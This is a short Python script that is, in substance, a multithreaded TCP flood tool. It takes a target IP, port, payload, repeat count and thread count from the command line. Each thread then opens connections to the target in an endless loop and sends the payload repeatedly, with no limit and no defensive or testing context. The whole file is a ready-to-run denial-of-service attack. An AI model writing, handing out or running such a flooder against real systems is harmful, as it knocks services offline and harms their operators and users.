import random
import socket
import threading
import sys

ip = sys.argv[1]
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])
payload = sys.argv[5]


def run():
	data = payload.encode("utf-8")
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("[*] Error")
for y in range(threads):
	th = threading.Thread(target = run)
	th.start()